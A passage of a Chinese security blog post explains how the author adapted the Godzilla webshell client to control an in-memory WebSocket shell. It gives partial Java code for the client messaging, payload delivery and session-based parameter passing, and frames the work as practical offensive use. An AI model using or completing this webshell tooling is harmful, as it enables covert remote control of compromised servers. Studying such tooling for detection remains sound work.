+<p>Godzilla客户端的流程我们可以看shellEntity的<code>initShellOpertion</code>​方法，最原始的initShellOpertion中只有这些内容，也就是一个大的if-else，本质还是通过判断当前是否有加载cache来进行CryptoModel的init和payload的init</p>
+<p><img src="/images/websocket/assets/image-20250528162136-oigjuxt.png" alt="image"></p>
+<p>这里我们从头到尾去微调和改造，肯定是先没有缓存的，也就代表着payload此时并没有加载进shell，所以要先通过CryptoModel去传输payload，对应的逻辑在<code>this.cryptionModel.init(this);</code>​</p>
+<p>当然，这么讲肯定迷糊，我们具体到代码看</p>
+<p>看一眼JavaCryptoModel的结构，拿最基础的AesBase64举例</p>
+<p><img src="/images/websocket/assets/image-20250528161731-jgaxoax.png" alt="image"></p>
+<p>最终的是init方法，后续除了generate方法（跟jsp马生成有关）我们不会接触到，其他都会讲一遍。这里以init入手，可以看到在加密功能初始化完成之后就开始获取payload并发送给shell端了。</p>
+<p><img src="/images/websocket/assets/image-20250528162759-cgr9zqv.png" alt="image"></p>
+<p>所以真正的godzilla初始化payload加载是在Crypto模块。</p>
+<p>那么我们应该怎么改呢？</p>
+<ul>
+<li>首先就是shellEntity中要写个判断，判断当前的Crypto模块是否为websocket类型，然后进获取websocketcrypto的逻辑</li>
+<li>websocketCryptoModel中肯定要发送payload，所以我们还先得写一个websocketpayload</li>
+<li>与shell通信也要封装一个类websocketClient，用来sendpayload</li>
+</ul>
+<p>理清楚之后发现websocketCrypto模块简直寸步难行，因为上述两个关键性类我们还没写完：websocketClient以及webscoketpayload。</p>
+<p>这里不先提Crypto模块又不好提上述这两个，所以我们接下来讲这两个，最后再回过头来看</p>
+<p>‍</p>
+<h3 id="webscoketClient新增"><a href="#webscoketClient新增" class="headerlink" title="webscoketClient新增"></a>webscoketClient新增</h3><p>新增之前肯定是先类比，我们类比Http</p>
+<p><img src="/images/websocket/assets/image-20250528164955-3zblbaj.png" alt="image"></p>
+<p>Http的发送连接功能对外暴露出<code>sendHttpResponse</code>​方法，然后层层往里进，封装参数，最外层是具体要传入的数据，具体在crypto中初始化表现为this.payload，所以我们也可以写一个类似的封装功能点。总结一下几个sendHttpResponse的逻辑，两个点，封装请求头，连接超时。这两个websocket都不需要去做，所以我们可以直接写成如下形式：</p>
+<p><img src="/images/websocket/assets/image-20250528165152-jhm0kkm.png" alt="image"></p>
+<p>​<code>sendRequestData</code>​我们要处理一下超时卡死的问题。websocketClient存在<code>onClose</code>​和<code>onError</code>​以及<code>onMessage</code>​方法。三个方法分别都会自动触发于各自的情况。而websocket一段接受到信息以及关闭连接或异常的时候，虽然在正常的websocket双端通信的时候不一定就代表测试客户端一定发送过消息了，但是在godzilla中由于我们的思路是用websocket模拟这个http的过程，所以是可以认为，只要这三个方法触发，当前客户端一定就发送过消息，所以可以设置一个sendFlag。<code>onClose</code>​ <code>onError</code>​ <code>onMessage</code>​就将其制为1，发送的时候就将其置为0。这么做的目的也是为了解决双端通信延迟的问题，当我们发送的消息被接受之后，shell端肯定会走onMessage，然后传信息回来。此时由于异步，我们Godzilla客户端的<code>onMessage</code>​就会被触发，并且sendFlag被设置为0，所以sendRequestData方法中的while循环判断其为0了，发送成功，所以退出等待循环，返回接收到的result。（这里我设置的值是50毫秒，这肯定是不专业的，只是为了测试避免不被卡死）</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">byte</span>[] sendRequestData(<span class="type">byte</span>[] requestData) &#123;</span><br><span class="line">        <span class="keyword">synchronized</span> (<span class="built_in">this</span>) &#123;</span><br><span class="line">            sendFlag =<span class="number">1</span>;</span><br><span class="line">            <span class="built_in">this</span>.send(requestData);</span><br><span class="line">            <span class="type">int</span> conut=<span class="number">0</span>;</span><br><span class="line">            <span class="keyword">while</span>(sendFlag!=<span class="number">0</span>) &#123;</span><br><span class="line">                <span class="keyword">try</span>&#123;</span><br><span class="line">                    conut =conut+<span class="number">1</span>;</span><br><span class="line">                    Thread.sleep(<span class="number">1</span>);</span><br><span class="line">                    <span class="keyword">if</span> (conut &gt;=<span class="number">50</span>)&#123;</span><br><span class="line">                         <span class="keyword">break</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;<span class="keyword">catch</span> (InterruptedException ignored)&#123;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<p>onMessage和onClose具体如下</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onMessage</span><span class="params">(ByteBuffer bytes)</span>&#123;</span><br><span class="line">       result=bytes.array();</span><br><span class="line">       sendFlag=<span class="number">0</span>;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="meta">@Override</span></span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onClose</span><span class="params">(<span class="type">int</span> i, String s, <span class="type">boolean</span> b)</span> &#123;</span><br><span class="line">           result=<span class="literal">null</span>;</span><br><span class="line">           <span class="built_in">this</span>.isConnected = <span class="literal">false</span>;</span><br><span class="line">           sendFlag=<span class="number">0</span>;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>
+
+<p>websocketClient其实解的差不多了，继续看websocket-payload</p>
+<h3 id="websocket-payload改造"><a href="#websocket-payload改造" class="headerlink" title="websocket-payload改造"></a>websocket-payload改造</h3><p>还是一样的对比，看javapayload，基本的东西就不解释了，之前的godzilla功能分析也讲的差不多了。我提几个关键点</p>
+<p>首先一点就是equals传值的时候调用handle进行类型处理写缓存，它是要根据具体的传入类型来写的。但是websocket的server端中是不存在直接获取servletRequest的手段的，但是存在<code>javax.websocket.session</code>​(tomcat版本不同包名不同),能够通过session间接获取到http的一些属性值</p>
+<p>服务端原本的javapayload的euqals与handle逻辑如下</p>
+<p><img src="/images/websocket/assets/image-20250527163918-ziq0yxv.png" alt="image"></p>
+<p>这里其实是可以获取到Request的，但是Request到底只是一个填充基本信息和打log的作用，equals最重要的是将结果字节数组还有servletContext传入payload缓存。一个是执行功能的结果，一个是插件加载。所以这里我就直接暴力改</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"> <span class="keyword">if</span> (<span class="built_in">this</span>.supportClass(obj, <span class="string">&quot;%s.websocket.Session&quot;</span>)) &#123;</span><br><span class="line">                    <span class="built_in">this</span>.websocketsession = obj;</span><br><span class="line">                &#125;  <span class="keyword">else</span> &#123;</span><br><span class="line">                    var10000 = class$<span class="number">0</span>;</span><br><span class="line">                    <span class="keyword">if</span> (var10000 == <span class="literal">null</span>) &#123;</span><br><span class="line">                        <span class="keyword">try</span> &#123;</span><br><span class="line">                            var10000 = Class.forName(<span class="string">&quot;[B&quot;</span>);</span><br><span class="line">                        &#125; <span class="keyword">catch</span> (ClassNotFoundException var6) &#123;</span><br><span class="line">                            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">NoClassDefFoundError</span>(((Throwable)var6).getMessage());</span><br><span class="line">                        &#125;</span><br><span class="line"></span><br><span class="line">                        class$<span class="number">0</span> = var10000;</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">if</span> (var10000.isAssignableFrom(obj.getClass())) &#123;</span><br><span class="line">                        <span class="built_in">this</span>.requestData = (<span class="type">byte</span>[])obj;</span><br><span class="line">                    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="built_in">this</span>.supportClass(obj, <span class="string">&quot;%s.websocket.Session&quot;</span>)) &#123;</span><br><span class="line">                        <span class="built_in">this</span>.websocketsession  = obj;</span><br><span class="line">                    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> <span class="built_in">this</span>.handlePayloadContext(obj);</span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">this</span>.servletRequest != <span class="literal">null</span> &amp;&amp; <span class="built_in">this</span>.requestData == <span class="literal">null</span>) &#123;</span><br><span class="line">                    <span class="type">Object</span> <span class="variable">var10001</span> <span class="operator">=</span> <span class="built_in">this</span>.servletRequest;</span><br><span class="line">                    Class[] var10003 = <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">1</span>];</span><br><span class="line">                    <span class="type">Class</span> <span class="variable">var10006</span> <span class="operator">=</span> class$<span class="number">2</span>;</span><br><span class="line">                    <span class="keyword">if</span> (var10006 == <span class="literal">null</span>) &#123;</span><br><span class="line">                        <span class="keyword">try</span> &#123;</span><br><span class="line">                            var10006 = Class.forName(<span class="string">&quot;java.lang.String&quot;</span>);</span><br><span class="line">                        &#125; <span class="keyword">catch</span> (ClassNotFoundException var5) &#123;</span><br><span class="line">                            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">NoClassDefFoundError</span>(((Throwable)var5).getMessage());</span><br><span class="line">                        &#125;</span><br><span class="line"></span><br><span class="line">                        class$<span class="number">2</span> = var10006;</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                    var10003[<span class="number">0</span>] = var10006;</span><br><span class="line">                    Object retVObject=<span class="literal">null</span>;</span><br><span class="line">                    Object retVObjectMap=<span class="literal">null</span>;</span><br><span class="line">                    <span class="keyword">try</span>&#123;</span><br><span class="line">						<span class="comment">//这么处理的利用在后续文字描述</span></span><br><span class="line">                        retVObject = invokeMethod(invokeMethod(var10001, <span class="string">&quot;getUserProperties&quot;</span>),<span class="string">&quot;get&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;parameters&quot;</span>&#125;);</span><br><span class="line">                    &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">                        e.printStackTrace();</span><br><span class="line">                    &#125;</span><br></pre></td></tr></table></figure>
+
+<p>这么改的理由是：我拒绝在payload中获取request为了碟醋包饺子，所以将所有的请求值都通过wsSeesion间接传入写缓存。然后在shell外部我可以这么处理<code>session.getUserProperties().put(&quot;parameters&quot;, data);</code>​也就是初始化之后，test或者其他功能发送过来之后，由于我客户端发的也是字节流，不在乎参数键值对，所以直接put进parameters。然后再通过equals将session传入之后，这里再通过反射取出这个字节流，赋值给retVObject即可，此时requestdata又会取得retVObject的值，传值处理就完毕了。后续toString甚至都不用处理</p>
+<p>这个payload改好之后要稍微改一下Godzilla的Javashell内容，因为它默认的获取payload是读取原始的payload字节，这里写个判断，然后让他读取我们刚才写好的websocketpayload就行</p>
+<p><img src="/images/websocket/assets/image-20250528172708-hiwdbwo.png" alt="image"></p>
+<p>现在完事具备，payload和client端都已经写好，只差CryptoModel了。回过头看其逻辑处理，要改两处地方</p>
+<p>一是在由于我们初始化payloadModel是因为我们在payloadModel-JavaShell的getPayload方法中写了一段通过shellEntity来判断当前加密模块的操作，但是在此之前我们是没有调用过PayloadModel的init的，所以shellEntity没有传入，会抛出空错误。为了解决这个问题，我们要在CryptoModel初始化之前就将payloadModel初始化了</p>
+<p>还有一个就是，由于我们没有写类似于httpResponse这种专门调回显的，所以CryptoModel也要承担一部分回显的功能，具体操作就是将<code>sendWebsocketResponse</code>​的结果进行接受处理</p>
+<p>除开前面一样的加密，具体如下</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">this</span>.shell.getPayloadModule().init(context);</span><br><span class="line">            <span class="built_in">this</span>.payload = <span class="built_in">this</span>.shell.getPayloadModule().getPayload();</span><br><span class="line">            <span class="keyword">if</span> (<span class="built_in">this</span>.payload != <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="type">int</span> total=<span class="number">0</span>;</span><br><span class="line">                <span class="built_in">this</span>.websocket.connect();</span><br><span class="line">                <span class="keyword">while</span> (!<span class="built_in">this</span>.websocket.getReadyState().equals(ReadyState.OPEN)) &#123;</span><br><span class="line">                    <span class="keyword">if</span> (total &gt;=<span class="number">5</span>)&#123;</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">try</span> &#123;</span><br><span class="line">                        total+=<span class="number">1</span>;</span><br><span class="line">                        Thread.sleep(<span class="number">1</span>);</span><br><span class="line">                    &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">                        <span class="built_in">this</span>.websocket.close();</span><br><span class="line">                        Log.error((Throwable)e);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;   </span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> (<span class="built_in">this</span>.websocket.isConnected) &#123;</span><br><span class="line">                    <span class="built_in">this</span>.result=<span class="built_in">this</span>.websocket.sendWebsocketResponse(<span class="built_in">this</span>.payload);</span><br><span class="line">                    <span class="built_in">this</span>.state = <span class="literal">true</span>;</span><br><span class="line">                &#125;</span><br></pre></td></tr></table></figure>
+
+<p>‍</p>
+<p>最后还有一段JavaShell的客户端改造，因为他跟payload本地class一起结合起来才能叫作websocketPayloadModel。得追溯到shellEntity部分，如果按照上面的思路改造完毕，那么肯定最后会来到payloadModel的test方法进行payloadclass是否在目标加载完毕的检测</p>
+<p><img src="/images/websocket/assets/image-20250528193140-epk5wiy.png" alt="image"></p>
+<p>此时的payloadModel是对应整个语言类型，JavaShell整个功能都是和payloadClass进行镜像对照的，只不过JavaShell最终还是要发数据和方法名过去，所以最终是通过一个方法完成的，其余所用功能只是封装了一下功能名称和参数，然后统一交给evalFunc去处理</p>
+<p><img src="/images/websocket/assets/image-20250528202604-or1ng2g.png" alt="image"></p>
+<p>那evalFunc其实也很简单了，只是把方法名和参数传递过去而已，这里记得GzipEncode一下，然后我们写一个判断当前请求是否是websocket请求，如果是就走webscoketClient的通信流程，将返回的数据进行两层decode之后就是结果了</p>
+<p>至此改造完毕</p>
+<p><img src="/images/websocket/assets/947211f4bf3346086a64b42d20e87b2b-20250528202912-uc8ucj4.png" alt="947211f4bf3346086a64b42d20e87b2b"></p>
+<p>‍</p>
+<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>改一个原始godzilla没什么用。我做这个事情的目的是为了理顺自己的构造思路，因为确实在网上搜不到其他的高可用实战化的websocket马，那只能自己从头开始搓了。这篇文章也是属于记录性质的，可能会稍微细节一点。但是我并没有放出所有代码，把思路讲清楚我觉得就差不多。那之后的进一步改造就可以顺着这个思路走了，想怎么二开就是自己的事情了，希望能够帮助到师傅们。</p>
+
+      </div>
+      
+        <div class="prev-or-next">
+          <div class="post-foot-next">
+            
+              <a href="/post/Rasp%E5%88%86%E6%9E%90%5B2%5D-OpenRasp%E6%BA%90%E7%A0%81%E9%98%85%E8%AF%BB.html" target="_self">
+                <i class="iconfont icon-chevronleft"></i>
+                <span>上一页</span>
+              </a>
+            
+          </div>
+          <div class="post-attach">
+            <span class="post-pubtime">
+              <i class="iconfont icon-updatetime mr-10" title="更新时间"></i>
+              2025-05-28 20:39:51
+            </span>
+            
+                  <span class="post-tags">
+                    <i class="iconfont icon-tags mr-10" title="标签"></i>
+                    
+                    <span class="span--tag mr-8">
+                      <a href="/tags/WebSocket/" title="WebSocket">
+                        #WebSocket
+                      </a>
+                    </span>
+                    
+                  </span>
+              
+          </div>
+          <div class="post-foot-prev">
+            
+          </div>
+        </div>
+      
+    </div>
+    
+  <div id="btn-catalog" class="btn-catalog">
+    <i class="iconfont icon-catalog"></i>
+  </div>
+  <div class="post-catalog hidden" id="catalog">
+    <div class="title">目录</div>
+    <div class="catalog-content">
+      
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-text">前言</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#websocket%E5%89%8D%E7%BD%AE"><span class="toc-text">websocket前置</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%8A%A8%E6%80%81%E6%B7%BB%E5%8A%A0%E8%87%AA%E5%AE%9A%E4%B9%89websocket%E6%8E%A2%E7%B4%A2"><span class="toc-text">动态添加自定义websocket探索</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-WsFilter%E5%88%A4%E6%96%AD%E5%A4%84%E7%90%86"><span class="toc-text">0x01 WsFilter判断处理</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9E%84%E9%80%A0ServerEndpointConfig"><span class="toc-text">构造ServerEndpointConfig</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8A%A8%E6%80%81%E8%8E%B7%E5%8F%96WsServerContainer"><span class="toc-text">动态获取WsServerContainer</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%A4%9A%E5%8A%9F%E8%83%BDshell%E5%AE%9E%E7%8E%B0"><span class="toc-text">多功能shell实现</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Websocketmemshell%E6%94%B9%E9%80%A0"><span class="toc-text">Websocketmemshell改造</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Godzilla%E6%94%B9%E9%80%A0"><span class="toc-text">Godzilla改造</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#webSocket-Cryption%E6%96%B0%E5%A2%9E"><span class="toc-text">webSocket-Cryption新增</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#webscoketClient%E6%96%B0%E5%A2%9E"><span class="toc-text">webscoketClient新增</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#websocket-payload%E6%94%B9%E9%80%A0"><span class="toc-text">websocket-payload改造</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-text">总结</span></a></li></ol>
+      
+    </div>
+  </div>
+
+  
+<script src="/js/catalog.js"></script>
+
+
+
+
+    
+      <div class="comments-container">
+        
+
+
+
+
+
+
+
+      </div>
+    
+  </div>
+
+
+        
+<div class="footer">
+  <div class="social">
+    <ul>
+      
+        <li>
+          
+              <a title="github" target="_blank" rel="noopener" href="https://github.com/zchengsite/hexo-theme-oranges">
+                <i class="iconfont icon-github"></i>
+              </a>
+              
+        </li>
+        
+    </ul>
+  </div>
+  
+    
+    <div class="footer-more">
+      
+        <a target="_blank" rel="noopener" href="https://github.com/zchengsite/hexo-theme-oranges">Copyright © 2025 Oranges</a>
+        
+    </div>
+  
+    
+    <div class="footer-more">
+      
+        <a target="_blank" rel="noopener" href="https://github.com/zchengsite/hexo-theme-oranges">Theme by Oranges | Powered by Hexo</a>
+        
+    </div>
+  
+  
+</div>
+
+      </div>
+
+      <div class="tools-bar">
+        <div class="back-to-top tools-bar-item hidden">
+  <a href="javascript: void(0)">
+    <i class="iconfont icon-chevronup"></i>
+  </a>
+</div>
+
+
+<script src="/js/backtotop.js"></script>
+
+
+
+        
+  <div class="search-icon tools-bar-item" id="search-icon">
+    <a href="javascript: void(0)">
+      <i class="iconfont icon-search"></i>
+    </a>
+  </div>
+
+  <div class="search-overlay hidden">
+    <div class="search-content" tabindex="0">
+      <div class="search-title">
+        <span class="search-icon-input">
+          <a href="javascript: void(0)">
+            <i class="iconfont icon-search"></i>
+          </a>
+        </span>
+        
+          <input type="text" class="search-input" id="search-input" placeholder="搜索...">
+        
+        <span class="search-close-icon" id="search-close-icon">
+          <a href="javascript: void(0)">
+            <i class="iconfont icon-close"></i>
+          </a>
+        </span>
+      </div>
+      <div class="search-result" id="search-result"></div>
+    </div>
+  </div>
+
+  <script type="text/javascript">
+    var inputArea = document.querySelector("#search-input")
+    var searchOverlayArea = document.querySelector(".search-overlay")
+
+    inputArea.onclick = function() {
+      getSearchFile()
+      this.onclick = null
+    }
+
+    inputArea.onkeydown = function() {
+      if(event.keyCode == 13)
+        return false
+    }
+
+    function openOrHideSearchContent() {
+      let isHidden = searchOverlayArea.classList.contains('hidden')
+      if (isHidden) {
+        searchOverlayArea.classList.remove('hidden')
+        document.body.classList.add('hidden')
+        // inputArea.focus()
+      } else {
+        searchOverlayArea.classList.add('hidden')
+        document.body.classList.remove('hidden')
+      }
+    }
+
+    function blurSearchContent(e) {
+      if (e.target === searchOverlayArea) {
+        openOrHideSearchContent()
+      }
+    }
+
+    document.querySelector("#search-icon").addEventListener("click", openOrHideSearchContent, false)
+    document.querySelector("#search-close-icon").addEventListener("click", openOrHideSearchContent, false)
+    searchOverlayArea.addEventListener("click", blurSearchContent, false)
+
+    var searchFunc = function (path, search_id, content_id) {
+      'use strict';
+      var $input = document.getElementById(search_id);
+      var $resultContent = document.getElementById(content_id);
+      $resultContent.innerHTML = "<ul><span class='local-search-empty'>首次搜索，正在载入索引文件，请稍后……<span></ul>";
+      $.ajax({
+        // 0x01. load xml file
+        url: path,
+        dataType: "xml",
+        success: function (xmlResponse) {
+          // 0x02. parse xml file
+          var datas = $("entry", xmlResponse).map(function () {
+            return {
+              title: $("title", this).text(),
+              content: $("content", this).text(),
+              url: $("url", this).text()
+            };
+          }).get();
+          $resultContent.innerHTML = "";
+
+          $input.addEventListener('input', function () {
+            // 0x03. parse query to keywords list
+            var str = '<ul class=\"search-result-list\">';
+            var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
+            $resultContent.innerHTML = "";
+            if (this.value.trim().length <= 0) {
+              return;
+            }
+            // 0x04. perform local searching
+            datas.forEach(function (data) {
+              var isMatch = true;
+              var content_index = [];
+              if (!data.title || data.title.trim() === '') {
+                data.title = "Untitled";
+              }
+              var orig_data_title = data.title.trim();
+              var data_title = orig_data_title.toLowerCase();
+              var orig_data_content = data.content.trim().replace(/<[^>]+>/g, "");
+              var data_content = orig_data_content.toLowerCase();
+              var data_url = data.url;
+              var index_title = -1;
+              var index_content = -1;
+              var first_occur = -1;
+              // only match artiles with not empty contents
+              if (data_content !== '') {
+                keywords.forEach(function (keyword, i) {
+                  index_title = data_title.indexOf(keyword);
+                  index_content = data_content.indexOf(keyword);
+
+                  if (index_title < 0 && index_content < 0) {
+                    isMatch = false;
+                  } else {
+                    if (index_content < 0) {
+                      index_content = 0;
+                    }
+                    if (i == 0) {
+                      first_occur = index_content;
+                    }
+                    // content_index.push({index_content:index_content, keyword_len:keyword_len});
+                  }
+                });
+              } else {
+                isMatch = false;
+              }
+              // 0x05. show search results
+              if (isMatch) {
+                str += "<li><a href='" + data_url + "' class='search-result-title'>" + orig_data_title + "</a>";
+                var content = orig_data_content;
+                if (first_occur >= 0) {
+                  // cut out 100 characters
+                  var start = first_occur - 20;
+                  var end = first_occur + 80;
+
+                  if (start < 0) {
+                    start = 0;
+                  }
+
+                  if (start == 0) {
+                    end = 100;
+                  }
+
+                  if (end > content.length) {
+                    end = content.length;
+                  }
+
+                  var match_content = content.substr(start, end);
+
+                  // highlight all keywords
+                  keywords.forEach(function (keyword) {
+                    var regS = new RegExp(keyword, "gi");
+                    match_content = match_content.replace(regS, "<span class=\"search-keyword\">" + keyword + "</span>");
+                  });
+
+                  str += "<p class=\"search-result-abstract\">" + match_content + "...</p>"
+                }
+                str += "</li>";
+              }
+            });
+            str += "</ul>";
+            if (str.indexOf('<li>') === -1) {
+              return $resultContent.innerHTML = "<ul><span class='local-search-empty'>没有找到内容，请尝试更换检索词。<span></ul>";
+            }
+            $resultContent.innerHTML = str;
+          });
+        },
+        error: function(xhr, status, error) {
+          $resultContent.innerHTML = ""
+          if (xhr.status === 404) {
+            $resultContent.innerHTML = "<ul><span class='local-search-empty'>未找到search.xml文件，具体请参考：<a href='https://github.com/zchengsite/hexo-theme-oranges#configuration' target='_black'>configuration</a><span></ul>";
+          } else {
+            $resultContent.innerHTML = "<ul><span class='local-search-empty'>请求失败，尝试重新刷新页面或稍后重试。<span></ul>";
+          }
+        }
+      });
+      $(document).on('click', '#search-close-icon', function() {
+        $('#search-input').val('');
+        $('#search-result').html('');
+      });
+    }
+
+    var getSearchFile = function() {
+        var path = "/search.xml";
+        searchFunc(path, 'search-input', 'search-result');
+    }
+  </script>
+
+
+
+
+        
+  <div class="tools-bar-item theme-icon" id="switch-color-scheme">
+    <a href="javascript: void(0)">
+      <i id="theme-icon" class="iconfont icon-moon"></i>
+    </a>
+  </div>
+
+  
+<script src="/js/colorscheme.js"></script>
+
+
+
+
+
+        
+  
+    <div class="share-icon tools-bar-item">
+      <a href="javascript: void(0)" id="share-icon">
+        <i class="iconfont iconshare"></i>
+      </a>
+      <div class="share-content hidden">
+        
+          <a class="share-item" href="https://twitter.com/intent/tweet?text=' + WebSocket%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC%E5%85%A8%E7%89%88%E6%9C%AC%E6%9E%84%E9%80%A0%E6%8E%A2%E7%B4%A2%E5%8F%8A%E5%AE%9E%E6%88%98%E5%8C%96%E5%88%A9%E7%94%A8 + '&url=' + http%3A%2F%2Fexample.com%2Fpost%2FWebSocket%25E5%259E%258B%25E5%2586%2585%25E5%25AD%2598%25E9%25A9%25AC%25E5%2585%25A8%25E7%2589%2588%25E6%259C%25AC%25E6%259E%2584%25E9%2580%25A0%25E6%258E%25A2%25E7%25B4%25A2%25E5%258F%258A%25E5%25AE%259E%25E6%2588%2598%25E5%258C%2596%25E5%2588%25A9%25E7%2594%25A8.html + '" target="_blank" title="Twitter">
+            <i class="iconfont icon-twitter"></i>
+          </a>
+        
+        
+          <a class="share-item" href="https://www.facebook.com/sharer.php?u=http://example.com/post/WebSocket%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC%E5%85%A8%E7%89%88%E6%9C%AC%E6%9E%84%E9%80%A0%E6%8E%A2%E7%B4%A2%E5%8F%8A%E5%AE%9E%E6%88%98%E5%8C%96%E5%88%A9%E7%94%A8.html" target="_blank" title="Facebook">
+            <i class="iconfont icon-facebooksquare"></i>
+          </a>
+        
+      </div>
+    </div>
+  
+  
+<script src="/js/shares.js"></script>
+
+
+
+      </div>
+    </div>
+  </body>
+</html>
